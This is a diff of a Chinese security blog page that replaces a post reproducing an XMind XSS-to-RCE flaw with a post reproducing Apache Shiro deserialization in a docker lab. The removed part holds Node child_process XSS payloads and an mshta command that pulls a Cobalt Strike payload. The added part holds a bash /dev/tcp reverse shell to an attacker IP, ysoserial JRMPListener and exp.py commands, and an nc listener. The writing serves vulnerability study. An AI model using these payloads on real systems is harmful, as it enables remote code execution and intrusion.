@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XMind思维导图XSS漏洞复现, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,工具分享">
+    <meta name="keywords" content="apache shiro 反序列化复现, CTF,渗透测试,web安全,内网渗透,Python,漏洞复现,工具分享">
     <meta name="description" content="专注于web安全、内网渗透,分享知识,分享菜鸡日常">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>XMind思维导图XSS漏洞复现 | salute0&#39;s blogs</title>
+    <title>apache shiro 反序列化复现 | salute0&#39;s blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -313,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XMind思维导图XSS漏洞复现</h1>
+                    <h1 class="description center-align post-title">apache shiro 反序列化复现</h1>
                 </div>
             </div>
         </div>
@@ -434,16 +434,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                <span class="chip bg-color">渗透测试</span>
-                            </a>
-                        
                             <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                                 <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
-                            <a href="/tags/XSS/">
-                                <span class="chip bg-color">XSS</span>
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
                     </div>
@@ -467,21 +463,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-17
+                    2021-09-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-16
+                    2021-09-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    454
+                    634
                 </div>
                 
 
@@ -503,48 +499,61 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>简介</strong>：XMind 是一个全功能的思维导图和头脑风暴软件，为激发灵感和创意而生。作为一款有效提升工作和生活效率的生产力工具，受到全球百千万用户的青睐。近期各大公众号平台曝出XMind xss存在远程执行RCE漏洞，我也是今天进行了漏洞复现。</p>
-<p><strong>环境</strong>：XMind-2020-for-Windows-64bit-10.3.1-202101070032.exe</p>
-<p><strong>复现</strong>：</p>
-<h2 id="1-打开XMind新建思维导图，进入大纲，测试基本xss代码。"><a href="#1-打开XMind新建思维导图，进入大纲，测试基本xss代码。" class="headerlink" title="1.打开XMind新建思维导图，进入大纲，测试基本xss代码。"></a>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</h2><p>payload：</p>
-<pre class=" language-html"><code class="language-html">&lt;img src=# onerror=alert('1')>
+                <p>靶场搭建</p>
+<pre class=" language-sh"><code class="language-sh">docker pull medicean/vulapps:s_shiro_1    #获取docker镜像
+systemctl restart docker        #重启docker
+docker run -d -p 8082:8080 medicean/vulapps:s_shiro_1   #启动docker镜像
+访问靶机的8082端口即可
 </code></pre>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p>
-<h2 id="2-测试RCE命令，我们通过打开计算器来展示。"><a href="#2-测试RCE命令，我们通过打开计算器来展示。" class="headerlink" title="2.测试RCE命令，我们通过打开计算器来展示。"></a>2.测试RCE命令，我们通过打开计算器来展示。</h2><p>payload：</p>
-<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>require(<span class="token punctuation">'</span>child_process<span class="token punctuation">'</span>).exec(<span class="token punctuation">'</span>calc.exe<span class="token punctuation">'</span>,null);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<p>环境</p>
+<p>靶机：192.168.3.125</p>
+<p>攻击机：192.168.3.118</p>
+<p>工具：</p>
+<p>ysoserial.jar</p>
+<p>exp.py</p>
+<p>nc</p>
+<p>ShiroExploit.V2.0</p>
+<p>我们访问192.168.3.125:8082输入用户名密码（随便输入）并且勾选上remember me利用burp抓包</p>
+<p>![](../images/apache shiro反序列化/1.png)</p>
+<p>我们看响应包发现rememberMe=deleteMe由此证明存在shiro反序列化漏洞</p>
+<p>![](../images/apache shiro反序列化/2.png)</p>
+<h3 id="我们首先利用纯手工实现shiro序列化反弹shell"><a href="#我们首先利用纯手工实现shiro序列化反弹shell" class="headerlink" title="我们首先利用纯手工实现shiro序列化反弹shell"></a>我们首先利用纯手工实现shiro序列化反弹shell</h3><h4 id="1-制作反弹shell代码"><a href="#1-制作反弹shell代码" class="headerlink" title="1.制作反弹shell代码"></a>1.制作反弹shell代码</h4><p>我们先生成初始反弹shell代码</p>
+<pre class=" language-sh"><code class="language-sh">bash -i >& /dev/tcp/192.168.3.118/888 0>&1
 </code></pre>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
-<h2 id="3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置"><a href="#3-接着我们构造payload来查看我们相关配置，这里我们查看网络设置" class="headerlink" title="3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置"></a>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</h2><p>payload：</p>
-<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs<span class="token punctuation">=</span>`,`base64`).toString())<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+<p>接着我们在<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html%E8%BF%9B%E8%A1%8C%E7%BC%96%E7%A0%81">http://www.jackson-t.ca/runtime-exec-payloads.html进行编码</a></p>
+<p>![](../images/apache shiro反序列化/3.png)</p>
+<h4 id="2-使用ysoserial中JRMP监听模块，监听666端口"><a href="#2-使用ysoserial中JRMP监听模块，监听666端口" class="headerlink" title="2.使用ysoserial中JRMP监听模块，监听666端口"></a>2.使用ysoserial中JRMP监听模块，监听666端口</h4><p>进入ysoserial.jar所在目录，执行以下代码，监听666端口</p>
+<pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 '编码内容'
 </code></pre>
-<pre class=" language-markdown"><code class="language-markdown">cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=
+<p>编码内容是刚刚编码之后的代码也就是</p>
+<pre class=" language-sh"><code class="language-sh">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}
 </code></pre>
-<p>经过base64解码是：</p>
-<pre class=" language-markdown"><code class="language-markdown">require('child_process').exec('ipconfig /all',(error, stdout, stderr)=>{    alert(<span class="token code keyword">`stdout: ${stdout}`</span>);
-  });
+<p>此时我们完整的执行代码就是</p>
+<pre class=" language-sh"><code class="language-sh">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTE4Lzg4OCAwPiYx}|{base64,-d}|{bash,-i}'
 </code></pre>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
-<h2 id="4-上线CobaltStrike"><a href="#4-上线CobaltStrike" class="headerlink" title="4.上线CobaltStrike"></a>4.上线CobaltStrike</h2><p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>（1）首先我们生成一个powershell command的payload</p>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
-<p> 生成的url为：</p>
-<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你设置的监听器IP:80/download/file.ext
+<p>![](../images/apache shiro反序列化/4.png)</p>
+<h4 id="3-生成cookie"><a href="#3-生成cookie" class="headerlink" title="3.生成cookie"></a>3.生成cookie</h4><p>前提：我们python必须安装了pycrypto库。没安装的可以执行以下命令安装</p>
+<pre class=" language-python"><code class="language-python">pip install pycrypto
 </code></pre>
-<p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
-<pre class=" language-http"><code class="language-http">mshta http://你设置的监听器IP:80/download/file.ext
+<p>我们执行如下代码即可生成包含攻击代码的cookie</p>
+<pre class=" language-sh"><code class="language-sh">python exp.py 攻击者ip:ysoserial监听的端口
 </code></pre>
-<p>（3）接着我们构造执行的XSS代码</p>
-<p>原始攻击payload：</p>
-<pre class=" language-html"><code class="language-html">&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=>{    alert(`stdout: ${stdout}`);
-
- });`,`base64`).toString())'>
+<p>此时我们的攻击机执行的代码是</p>
+<pre class=" language-sh"><code class="language-sh">python exp.py 192.168.3.118:666
 </code></pre>
-<p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p>
-<p>接着我们就看到cs上线成功</p>
-<p><img src="../images/XMind%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BEXSS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p>![](../images/apache shiro反序列化/5.png)</p>
+<p>我们可以看见此时已经生成了含有攻击代码的cookie</p>
+<h4 id="4-nc监听，burp修改cookie"><a href="#4-nc监听，burp修改cookie" class="headerlink" title="4.nc监听，burp修改cookie"></a>4.nc监听，burp修改cookie</h4><p>我们利用nc开始监听我们最初反弹shell的端口</p>
+<pre class=" language-sh"><code class="language-sh">nc -lvvp 888
+</code></pre>
+<p>接着我们利用burp修改cookie![](../images/apache shiro反序列化/6.png)</p>
+<p>最后发包就可以成功反弹shell</p>
+<p>![](../images/apache shiro反序列化/7.png)</p>
+<h3 id="我们接下来使用工具自动化完成shiro反序列化利用"><a href="#我们接下来使用工具自动化完成shiro反序列化利用" class="headerlink" title="我们接下来使用工具自动化完成shiro反序列化利用"></a>我们接下来使用工具自动化完成shiro反序列化利用</h3><p>我们使用ShiroExploit.V2.0，双击ShiroExploit.jar打开工具</p>
+<p>![](../images/apache shiro反序列化/8.png)</p>
+<p>我们在url处输入存在shiro反序列化漏洞的url地址，选择命令执行。不断切换我们的列（PAYLOAD）尝试哪个payload可以利用，最后我们输入我们要执行的命令即可进行远程命令执行。</p>
+<p>这里我环境的payload是CommonsCollections2</p>
+<p>![](../images/apache shiro反序列化/9.png)</p>
 
                 
             </div>
@@ -561,7 +570,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">sererdipity</a>
+                    <a href="/about" rel="external nofollow noreferrer">salute0</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -571,7 +580,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://salute0.github.io/posts/7225.html">https://salute0.github.io/posts/7225.html</a>
+                    <a href="https://salute0.github.io/posts/af27.html">https://salute0.github.io/posts/af27.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -584,7 +593,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">sererdipity</a>
+                    <a href="/about" target="_blank">salute0</a>
                     !
                 </span>
             </div>
@@ -609,16 +618,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-                                    <span class="chip bg-color">渗透测试</span>
-                                </a>
-                            
                                 <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                                     <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
-                                <a href="/tags/XSS/">
-                                    <span class="chip bg-color">XSS</span>
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
                                 </a>
                             
                         </div>
@@ -1056,17 +1061,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/38006.html">
+                <a href="/posts/af27.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Centos7部署PHP+Mysql+Apache">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="apache shiro 反序列化复现">
                         
-                        <span class="card-title">Centos7部署PHP+Mysql+Apache</span>
+                        <span class="card-title">apache shiro 反序列化复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1076,34 +1082,31 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Linux/" class="post-category">
-                                    Linux
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
-                    <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-                        <span class="chip bg-color">环境搭建</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BD%91%E9%A1%B5%E6%9C%8D%E5%8A%A1/">
-                        <span class="chip bg-color">网页服务</span>
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
                     </a>
                     
                 </div>
@@ -1117,13 +1120,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/62838.html">
+                <a href="/posts/ca44.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Centos7服务器安装java环境">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Windows建立隐藏用户远程连接">
                         
-                        <span class="card-title">Centos7服务器安装java环境</span>
+                        <span class="card-title">Windows建立隐藏用户远程连接</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1134,14 +1137,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-19
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Linux/" class="post-category">
-                                    Linux
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
@@ -1151,12 +1154,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/Windows%E5%90%8E%E9%97%A8/">
+                        <span class="chip bg-color">Windows后门</span>
                     </a>
                     
-                    <a href="/tags/%E8%8F%9C%E9%B8%A1%E6%97%A5%E5%B8%B8/">
-                        <span class="chip bg-color">菜鸡日常</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
